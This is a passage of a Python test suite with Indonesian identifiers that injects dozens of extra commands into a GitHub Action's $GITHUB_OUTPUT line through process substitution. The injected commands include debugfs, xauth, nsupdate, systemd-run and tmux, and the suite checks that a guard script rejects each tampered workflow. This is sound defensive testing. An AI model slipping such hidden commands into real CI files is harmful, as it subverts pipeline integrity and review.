                "gerbang gagal (Audit 1316)", rc != 0)
        shutil.rmtree(sub539, ignore_errors=True)
        sub540 = klon(tmp, "sub540")
        berkas_aksi540 = os.path.join(
            sub540, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi540, encoding="utf-8") as f:
            isi_aksi540 = f.read()
        baris_aksi540 = [b for b in isi_aksi540.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru540 = isi_aksi540.replace(
                baris_aksi540,
                baris_aksi540.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(script -qec cat /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru540 != isi_aksi540, \
            "suntikan aksi540 tidak menembak"
        with open(berkas_aksi540, "w", encoding="utf-8") as f:
            f.write(isi_baru540)
        rc, out = jalan(sub540, [sys.executable, GERBANG, "--semua"])
        periksa("script -qec cat /dev/null: "
                "gerbang gagal (Audit 1317)", rc != 0)
        shutil.rmtree(sub540, ignore_errors=True)
        sub541 = klon(tmp, "sub541")
        berkas_aksi541 = os.path.join(
            sub541, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi541, encoding="utf-8") as f:
            isi_aksi541 = f.read()
        baris_aksi541 = [b for b in isi_aksi541.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru541 = isi_aksi541.replace(
                baris_aksi541,
                baris_aksi541.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(i386 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru541 != isi_aksi541, \
            "suntikan aksi541 tidak menembak"
        with open(berkas_aksi541, "w", encoding="utf-8") as f:
            f.write(isi_baru541)
        rc, out = jalan(sub541, [sys.executable, GERBANG, "--semua"])
        periksa("i386 cat: "
                "gerbang gagal (Audit 1318)", rc != 0)
        shutil.rmtree(sub541, ignore_errors=True)
        sub542 = klon(tmp, "sub542")
        berkas_aksi542 = os.path.join(
            sub542, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi542, encoding="utf-8") as f:
            isi_aksi542 = f.read()
        baris_aksi542 = [b for b in isi_aksi542.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru542 = isi_aksi542.replace(
                baris_aksi542,
                baris_aksi542.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-run --scope --quiet cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru542 != isi_aksi542, \
            "suntikan aksi542 tidak menembak"
        with open(berkas_aksi542, "w", encoding="utf-8") as f:
            f.write(isi_baru542)
        rc, out = jalan(sub542, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-run --scope --quiet cat: "
                "gerbang gagal (Audit 1319)", rc != 0)
        shutil.rmtree(sub542, ignore_errors=True)
        sub543 = klon(tmp, "sub543")
        berkas_aksi543 = os.path.join(
            sub543, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi543, encoding="utf-8") as f:
            isi_aksi543 = f.read()
        baris_aksi543 = [b for b in isi_aksi543.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru543 = isi_aksi543.replace(
                baris_aksi543,
                baris_aksi543.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tmux load-buffer -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru543 != isi_aksi543, \
            "suntikan aksi543 tidak menembak"
        with open(berkas_aksi543, "w", encoding="utf-8") as f:
            f.write(isi_baru543)
        rc, out = jalan(sub543, [sys.executable, GERBANG, "--semua"])
        periksa("tmux load-buffer -: "
                "gerbang gagal (Audit 1320)", rc != 0)
        shutil.rmtree(sub543, ignore_errors=True)
        sub544 = klon(tmp, "sub544")
        berkas_aksi544 = os.path.join(
            sub544, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi544, encoding="utf-8") as f:
            isi_aksi544 = f.read()
        baris_aksi544 = [b for b in isi_aksi544.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru544 = isi_aksi544.replace(
                baris_aksi544,
                baris_aksi544.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-sysusers --root=/tmp -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru544 != isi_aksi544, \
            "suntikan aksi544 tidak menembak"
        with open(berkas_aksi544, "w", encoding="utf-8") as f:
            f.write(isi_baru544)
        rc, out = jalan(sub544, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-sysusers --root=/tmp -: "
                "gerbang gagal (Audit 1321)", rc != 0)
        shutil.rmtree(sub544, ignore_errors=True)
        sub545 = klon(tmp, "sub545")
        berkas_aksi545 = os.path.join(
            sub545, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi545, encoding="utf-8") as f:
            isi_aksi545 = f.read()
        baris_aksi545 = [b for b in isi_aksi545.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru545 = isi_aksi545.replace(
                baris_aksi545,
                baris_aksi545.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-tmpfiles --root=/tmp --create -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru545 != isi_aksi545, \
            "suntikan aksi545 tidak menembak"
        with open(berkas_aksi545, "w", encoding="utf-8") as f:
            f.write(isi_baru545)
        rc, out = jalan(sub545, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-tmpfiles --root=/tmp --create -: "
                "gerbang gagal (Audit 1322)", rc != 0)
        shutil.rmtree(sub545, ignore_errors=True)
        sub546 = klon(tmp, "sub546")
        berkas_aksi546 = os.path.join(
            sub546, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi546, encoding="utf-8") as f:
            isi_aksi546 = f.read()
        baris_aksi546 = [b for b in isi_aksi546.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru546 = isi_aksi546.replace(
                baris_aksi546,
                baris_aksi546.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-creds encrypt --name=uji - out; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru546 != isi_aksi546, \
            "suntikan aksi546 tidak menembak"
        with open(berkas_aksi546, "w", encoding="utf-8") as f:
            f.write(isi_baru546)
        rc, out = jalan(sub546, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-creds encrypt --name=uji - out: "
                "gerbang gagal (Audit 1323)", rc != 0)
        shutil.rmtree(sub546, ignore_errors=True)
        sub547 = klon(tmp, "sub547")
        berkas_aksi547 = os.path.join(
            sub547, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi547, encoding="utf-8") as f:
            isi_aksi547 = f.read()
        baris_aksi547 = [b for b in isi_aksi547.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru547 = isi_aksi547.replace(
                baris_aksi547,
                baris_aksi547.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debconf-set-selections --checkonly; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru547 != isi_aksi547, \
            "suntikan aksi547 tidak menembak"
        with open(berkas_aksi547, "w", encoding="utf-8") as f:
            f.write(isi_baru547)
        rc, out = jalan(sub547, [sys.executable, GERBANG, "--semua"])
        periksa("debconf-set-selections --checkonly: "
                "gerbang gagal (Audit 1324)", rc != 0)
        shutil.rmtree(sub547, ignore_errors=True)
        sub548 = klon(tmp, "sub548")
        berkas_aksi548 = os.path.join(
            sub548, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi548, encoding="utf-8") as f:
            isi_aksi548 = f.read()
        baris_aksi548 = [b for b in isi_aksi548.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru548 = isi_aksi548.replace(
                baris_aksi548,
                baris_aksi548.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debconf-communicate paketuji; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru548 != isi_aksi548, \
            "suntikan aksi548 tidak menembak"
        with open(berkas_aksi548, "w", encoding="utf-8") as f:
            f.write(isi_baru548)
        rc, out = jalan(sub548, [sys.executable, GERBANG, "--semua"])
        periksa("debconf-communicate paketuji: "
                "gerbang gagal (Audit 1325)", rc != 0)
        shutil.rmtree(sub548, ignore_errors=True)
        sub549 = klon(tmp, "sub549")
        berkas_aksi549 = os.path.join(
            sub549, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi549, encoding="utf-8") as f:
            isi_aksi549 = f.read()
        baris_aksi549 = [b for b in isi_aksi549.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru549 = isi_aksi549.replace(
                baris_aksi549,
                baris_aksi549.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(dpkg-deb --contents -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru549 != isi_aksi549, \
            "suntikan aksi549 tidak menembak"
        with open(berkas_aksi549, "w", encoding="utf-8") as f:
            f.write(isi_baru549)
        rc, out = jalan(sub549, [sys.executable, GERBANG, "--semua"])
        periksa("dpkg-deb --contents -: "
                "gerbang gagal (Audit 1326)", rc != 0)
        shutil.rmtree(sub549, ignore_errors=True)
        sub550 = klon(tmp, "sub550")
        berkas_aksi550 = os.path.join(
            sub550, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi550, encoding="utf-8") as f:
            isi_aksi550 = f.read()
        baris_aksi550 = [b for b in isi_aksi550.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru550 = isi_aksi550.replace(
                baris_aksi550,
                baris_aksi550.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(dpkg-parsechangelog -l -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru550 != isi_aksi550, \
            "suntikan aksi550 tidak menembak"
        with open(berkas_aksi550, "w", encoding="utf-8") as f:
            f.write(isi_baru550)
        rc, out = jalan(sub550, [sys.executable, GERBANG, "--semua"])
        periksa("dpkg-parsechangelog -l -: "
                "gerbang gagal (Audit 1327)", rc != 0)
        shutil.rmtree(sub550, ignore_errors=True)
        sub551 = klon(tmp, "sub551")
        berkas_aksi551 = os.path.join(
            sub551, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi551, encoding="utf-8") as f:
            isi_aksi551 = f.read()
        baris_aksi551 = [b for b in isi_aksi551.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru551 = isi_aksi551.replace(
                baris_aksi551,
                baris_aksi551.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cvtsudoers -f json; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru551 != isi_aksi551, \
            "suntikan aksi551 tidak menembak"
        with open(berkas_aksi551, "w", encoding="utf-8") as f:
            f.write(isi_baru551)
        rc, out = jalan(sub551, [sys.executable, GERBANG, "--semua"])
        periksa("cvtsudoers -f json: "
                "gerbang gagal (Audit 1328)", rc != 0)
        shutil.rmtree(sub551, ignore_errors=True)
        sub552 = klon(tmp, "sub552")
        berkas_aksi552 = os.path.join(
            sub552, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi552, encoding="utf-8") as f:
            isi_aksi552 = f.read()
        baris_aksi552 = [b for b in isi_aksi552.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru552 = isi_aksi552.replace(
                baris_aksi552,
                baris_aksi552.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tic -o out -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru552 != isi_aksi552, \
            "suntikan aksi552 tidak menembak"
        with open(berkas_aksi552, "w", encoding="utf-8") as f:
            f.write(isi_baru552)
        rc, out = jalan(sub552, [sys.executable, GERBANG, "--semua"])
        periksa("tic -o out -: "
                "gerbang gagal (Audit 1329)", rc != 0)
        shutil.rmtree(sub552, ignore_errors=True)
        sub553 = klon(tmp, "sub553")
        berkas_aksi553 = os.path.join(
            sub553, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi553, encoding="utf-8") as f:
            isi_aksi553 = f.read()
        baris_aksi553 = [b for b in isi_aksi553.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru553 = isi_aksi553.replace(
                baris_aksi553,
                baris_aksi553.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(lesskey -o out -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru553 != isi_aksi553, \
            "suntikan aksi553 tidak menembak"
        with open(berkas_aksi553, "w", encoding="utf-8") as f:
            f.write(isi_baru553)
        rc, out = jalan(sub553, [sys.executable, GERBANG, "--semua"])
        periksa("lesskey -o out -: "
                "gerbang gagal (Audit 1330)", rc != 0)
        shutil.rmtree(sub553, ignore_errors=True)
        sub554 = klon(tmp, "sub554")
        berkas_aksi554 = os.path.join(
            sub554, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi554, encoding="utf-8") as f:
            isi_aksi554 = f.read()
        baris_aksi554 = [b for b in isi_aksi554.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru554 = isi_aksi554.replace(
                baris_aksi554,
                baris_aksi554.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xkbcomp -xkb - out; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru554 != isi_aksi554, \
            "suntikan aksi554 tidak menembak"
        with open(berkas_aksi554, "w", encoding="utf-8") as f:
            f.write(isi_baru554)
        rc, out = jalan(sub554, [sys.executable, GERBANG, "--semua"])
        periksa("xkbcomp -xkb - out: "
                "gerbang gagal (Audit 1331)", rc != 0)
        shutil.rmtree(sub554, ignore_errors=True)
        sub555 = klon(tmp, "sub555")
        berkas_aksi555 = os.path.join(
            sub555, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi555, encoding="utf-8") as f:
            isi_aksi555 = f.read()
        baris_aksi555 = [b for b in isi_aksi555.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru555 = isi_aksi555.replace(
                baris_aksi555,
                baris_aksi555.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(wayland-scanner client-header /dev/stdin out; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru555 != isi_aksi555, \
            "suntikan aksi555 tidak menembak"
        with open(berkas_aksi555, "w", encoding="utf-8") as f:
            f.write(isi_baru555)
        rc, out = jalan(sub555, [sys.executable, GERBANG, "--semua"])
        periksa("wayland-scanner client-header /dev/stdin out: "
                "gerbang gagal (Audit 1332)", rc != 0)
        shutil.rmtree(sub555, ignore_errors=True)
        sub556 = klon(tmp, "sub556")
        berkas_aksi556 = os.path.join(
            sub556, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi556, encoding="utf-8") as f:
            isi_aksi556 = f.read()
        baris_aksi556 = [b for b in isi_aksi556.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru556 = isi_aksi556.replace(
                baris_aksi556,
                baris_aksi556.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(localedef --prefix=/tmp -i - -f UTF-8 uji_XX; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru556 != isi_aksi556, \
            "suntikan aksi556 tidak menembak"
        with open(berkas_aksi556, "w", encoding="utf-8") as f:
            f.write(isi_baru556)
        rc, out = jalan(sub556, [sys.executable, GERBANG, "--semua"])
        periksa("localedef --prefix=/tmp -i - -f UTF-8 uji_XX: "
                "gerbang gagal (Audit 1333)", rc != 0)
        shutil.rmtree(sub556, ignore_errors=True)
        sub557 = klon(tmp, "sub557")
        berkas_aksi557 = os.path.join(
            sub557, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi557, encoding="utf-8") as f:
            isi_aksi557 = f.read()
        baris_aksi557 = [b for b in isi_aksi557.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru557 = isi_aksi557.replace(
                baris_aksi557,
                baris_aksi557.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(glib-genmarshal -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru557 != isi_aksi557, \
            "suntikan aksi557 tidak menembak"
        with open(berkas_aksi557, "w", encoding="utf-8") as f:
            f.write(isi_baru557)
        rc, out = jalan(sub557, [sys.executable, GERBANG, "--semua"])
        periksa("glib-genmarshal -: "
                "gerbang gagal (Audit 1334)", rc != 0)
        shutil.rmtree(sub557, ignore_errors=True)
        sub558 = klon(tmp, "sub558")
        berkas_aksi558 = os.path.join(
            sub558, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi558, encoding="utf-8") as f:
            isi_aksi558 = f.read()
        baris_aksi558 = [b for b in isi_aksi558.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru558 = isi_aksi558.replace(
                baris_aksi558,
                baris_aksi558.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(genrb -d outdir -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru558 != isi_aksi558, \
            "suntikan aksi558 tidak menembak"
        with open(berkas_aksi558, "w", encoding="utf-8") as f:
            f.write(isi_baru558)
        rc, out = jalan(sub558, [sys.executable, GERBANG, "--semua"])
        periksa("genrb -d outdir -: "
                "gerbang gagal (Audit 1335)", rc != 0)
        shutil.rmtree(sub558, ignore_errors=True)
        sub559 = klon(tmp, "sub559")
        berkas_aksi559 = os.path.join(
            sub559, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi559, encoding="utf-8") as f:
            isi_aksi559 = f.read()
        baris_aksi559 = [b for b in isi_aksi559.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru559 = isi_aksi559.replace(
                baris_aksi559,
                baris_aksi559.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pod2man; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru559 != isi_aksi559, \
            "suntikan aksi559 tidak menembak"
        with open(berkas_aksi559, "w", encoding="utf-8") as f:
            f.write(isi_baru559)
        rc, out = jalan(sub559, [sys.executable, GERBANG, "--semua"])
        periksa("pod2man: "
                "gerbang gagal (Audit 1336)", rc != 0)
        shutil.rmtree(sub559, ignore_errors=True)
        sub560 = klon(tmp, "sub560")
        berkas_aksi560 = os.path.join(
            sub560, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi560, encoding="utf-8") as f:
            isi_aksi560 = f.read()
        baris_aksi560 = [b for b in isi_aksi560.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru560 = isi_aksi560.replace(
                baris_aksi560,
                baris_aksi560.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(splain; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru560 != isi_aksi560, \
            "suntikan aksi560 tidak menembak"
        with open(berkas_aksi560, "w", encoding="utf-8") as f:
            f.write(isi_baru560)
        rc, out = jalan(sub560, [sys.executable, GERBANG, "--semua"])
        periksa("splain: "
                "gerbang gagal (Audit 1337)", rc != 0)
        shutil.rmtree(sub560, ignore_errors=True)
        sub561 = klon(tmp, "sub561")
        berkas_aksi561 = os.path.join(
            sub561, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi561, encoding="utf-8") as f:
            isi_aksi561 = f.read()
        baris_aksi561 = [b for b in isi_aksi561.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru561 = isi_aksi561.replace(
                baris_aksi561,
                baris_aksi561.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(instmodsh; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru561 != isi_aksi561, \
            "suntikan aksi561 tidak menembak"
        with open(berkas_aksi561, "w", encoding="utf-8") as f:
            f.write(isi_baru561)
        rc, out = jalan(sub561, [sys.executable, GERBANG, "--semua"])
        periksa("instmodsh: "
                "gerbang gagal (Audit 1338)", rc != 0)
        shutil.rmtree(sub561, ignore_errors=True)
        sub562 = klon(tmp, "sub562")
        berkas_aksi562 = os.path.join(
            sub562, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi562, encoding="utf-8") as f:
            isi_aksi562 = f.read()
        baris_aksi562 = [b for b in isi_aksi562.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru562 = isi_aksi562.replace(
                baris_aksi562,
                baris_aksi562.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pygettext3 -o out -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru562 != isi_aksi562, \
            "suntikan aksi562 tidak menembak"
        with open(berkas_aksi562, "w", encoding="utf-8") as f:
            f.write(isi_baru562)
        rc, out = jalan(sub562, [sys.executable, GERBANG, "--semua"])
        periksa("pygettext3 -o out -: "
                "gerbang gagal (Audit 1339)", rc != 0)
        shutil.rmtree(sub562, ignore_errors=True)
        sub563 = klon(tmp, "sub563")
        berkas_aksi563 = os.path.join(
            sub563, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi563, encoding="utf-8") as f:
            isi_aksi563 = f.read()
        baris_aksi563 = [b for b in isi_aksi563.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru563 = isi_aksi563.replace(
                baris_aksi563,
                baris_aksi563.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(nsupdate; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru563 != isi_aksi563, \
            "suntikan aksi563 tidak menembak"
        with open(berkas_aksi563, "w", encoding="utf-8") as f:
            f.write(isi_baru563)
        rc, out = jalan(sub563, [sys.executable, GERBANG, "--semua"])
        periksa("nsupdate: "
                "gerbang gagal (Audit 1340)", rc != 0)
        shutil.rmtree(sub563, ignore_errors=True)
        sub564 = klon(tmp, "sub564")
        berkas_aksi564 = os.path.join(
            sub564, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi564, encoding="utf-8") as f:
            isi_aksi564 = f.read()
        baris_aksi564 = [b for b in isi_aksi564.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru564 = isi_aksi564.replace(
                baris_aksi564,
                baris_aksi564.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ssh-keygen -L -f -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru564 != isi_aksi564, \
            "suntikan aksi564 tidak menembak"
        with open(berkas_aksi564, "w", encoding="utf-8") as f:
            f.write(isi_baru564)
        rc, out = jalan(sub564, [sys.executable, GERBANG, "--semua"])
        periksa("ssh-keygen -L -f -: "
                "gerbang gagal (Audit 1341)", rc != 0)
        shutil.rmtree(sub564, ignore_errors=True)
        sub565 = klon(tmp, "sub565")
        berkas_aksi565 = os.path.join(
            sub565, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi565, encoding="utf-8") as f:
            isi_aksi565 = f.read()
        baris_aksi565 = [b for b in isi_aksi565.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru565 = isi_aksi565.replace(
                baris_aksi565,
                baris_aksi565.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru565 != isi_aksi565, \
            "suntikan aksi565 tidak menembak"
        with open(berkas_aksi565, "w", encoding="utf-8") as f:
            f.write(isi_baru565)
        rc, out = jalan(sub565, [sys.executable, GERBANG, "--semua"])
        periksa("tree --fromfile: "
                "gerbang gagal (Audit 1342)", rc != 0)
        shutil.rmtree(sub565, ignore_errors=True)
        sub566 = klon(tmp, "sub566")
        berkas_aksi566 = os.path.join(
            sub566, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi566, encoding="utf-8") as f:
            isi_aksi566 = f.read()
        baris_aksi566 = [b for b in isi_aksi566.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru566 = isi_aksi566.replace(
                baris_aksi566,
                baris_aksi566.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gio save tujuan; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru566 != isi_aksi566, \
            "suntikan aksi566 tidak menembak"
        with open(berkas_aksi566, "w", encoding="utf-8") as f:
            f.write(isi_baru566)
        rc, out = jalan(sub566, [sys.executable, GERBANG, "--semua"])
        periksa("gio save tujuan: "
                "gerbang gagal (Audit 1343)", rc != 0)
        shutil.rmtree(sub566, ignore_errors=True)
        sub567 = klon(tmp, "sub567")
        berkas_aksi567 = os.path.join(
            sub567, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi567, encoding="utf-8") as f:
            isi_aksi567 = f.read()
        baris_aksi567 = [b for b in isi_aksi567.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru567 = isi_aksi567.replace(
                baris_aksi567,
                baris_aksi567.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs /tmp/citra.img; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru567 != isi_aksi567, \
            "suntikan aksi567 tidak menembak"
        with open(berkas_aksi567, "w", encoding="utf-8") as f:
            f.write(isi_baru567)
        rc, out = jalan(sub567, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs /tmp/citra.img: "
                "gerbang gagal (Audit 1344)", rc != 0)
        shutil.rmtree(sub567, ignore_errors=True)
        sub568 = klon(tmp, "sub568")
        berkas_aksi568 = os.path.join(
            sub568, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi568, encoding="utf-8") as f:
            isi_aksi568 = f.read()
        baris_aksi568 = [b for b in isi_aksi568.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru568 = isi_aksi568.replace(
                baris_aksi568,
                baris_aksi568.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xauth -f berkas; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru568 != isi_aksi568, \
            "suntikan aksi568 tidak menembak"
        with open(berkas_aksi568, "w", encoding="utf-8") as f:
            f.write(isi_baru568)
        rc, out = jalan(sub568, [sys.executable, GERBANG, "--semua"])
        periksa("xauth -f berkas: "
                "gerbang gagal (Audit 1345)", rc != 0)
        shutil.rmtree(sub568, ignore_errors=True)
        sub569 = klon(tmp, "sub569")
        berkas_aksi569 = os.path.join(
            sub569, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi569, encoding="utf-8") as f:
            isi_aksi569 = f.read()
        baris_aksi569 = [b for b in isi_aksi569.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru569 = isi_aksi569.replace(
                baris_aksi569,
                baris_aksi569.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-run --remain-after-exit --scope cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru569 != isi_aksi569, \
            "suntikan aksi569 tidak menembak"
        with open(berkas_aksi569, "w", encoding="utf-8") as f:
            f.write(isi_baru569)
        rc, out = jalan(sub569, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-run --remain-after-exit --scope cat: "
                "gerbang lolos (Audit 1347)", rc == 0)
        shutil.rmtree(sub569, ignore_errors=True)
        sub570 = klon(tmp, "sub570")
        berkas_aksi570 = os.path.join(
            sub570, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi570, encoding="utf-8") as f:
            isi_aksi570 = f.read()
        baris_aksi570 = [b for b in isi_aksi570.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru570 = isi_aksi570.replace(
                baris_aksi570,
                baris_aksi570.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gm convert -append - gabung.png; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru570 != isi_aksi570, \
            "suntikan aksi570 tidak menembak"
        with open(berkas_aksi570, "w", encoding="utf-8") as f:
            f.write(isi_baru570)
        rc, out = jalan(sub570, [sys.executable, GERBANG, "--semua"])
        periksa("gm convert -append - gabung.png: "
                "gerbang gagal (Audit 1348)", rc != 0)
        shutil.rmtree(sub570, ignore_errors=True)
        sub571 = klon(tmp, "sub571")
        berkas_aksi571 = os.path.join(
            sub571, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi571, encoding="utf-8") as f:
            isi_aksi571 = f.read()
        baris_aksi571 = [b for b in isi_aksi571.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru571 = isi_aksi571.replace(
                baris_aksi571,
                baris_aksi571.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pr berkas.txt -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru571 != isi_aksi571, \
            "suntikan aksi571 tidak menembak"
        with open(berkas_aksi571, "w", encoding="utf-8") as f:
            f.write(isi_baru571)
        rc, out = jalan(sub571, [sys.executable, GERBANG, "--semua"])
        periksa("pr berkas.txt -: "
                "gerbang gagal (Audit 1349)", rc != 0)
        shutil.rmtree(sub571, ignore_errors=True)
